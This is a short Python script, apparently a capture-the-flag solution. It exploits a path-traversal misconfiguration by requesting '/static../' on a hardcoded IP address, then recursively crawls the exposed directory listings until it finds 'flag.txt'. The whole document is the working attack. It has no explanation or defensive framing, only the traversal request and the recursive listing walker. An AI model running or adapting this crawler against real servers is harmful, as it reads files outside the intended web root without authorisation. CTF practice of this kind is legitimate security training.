import requests
from lxml import etree

def getAContextList(etree)-> list:
    return etree.xpath('//pre/a[@href]/text()');

def getResponse(url) -> str:
    try:
        require = requests.get(url);
        if require.status_code == 200:
            return require.text;
        else:
            return "#error";
    except:
        return '#error';

URL = 'http://1.14.76.220/static../';

document = etree.HTML(getResponse(URL));
first = getAContextList(document);

#dfs
def dfs(url) -> bool :
    doc = getAContextList(etree.HTML(getResponse(url)));
    if len(doc) >= 2:
        for i in range(5,len(doc)):
            i = doc[i];
            target = url + i;
            print(target);
            if 'flag.txt' in target:
                exit();
            elif '/' in i:
                dfs(target);
    

for every in range(len(first) - 1,0,-1):
        target = URL + first[every];
        dfs(target);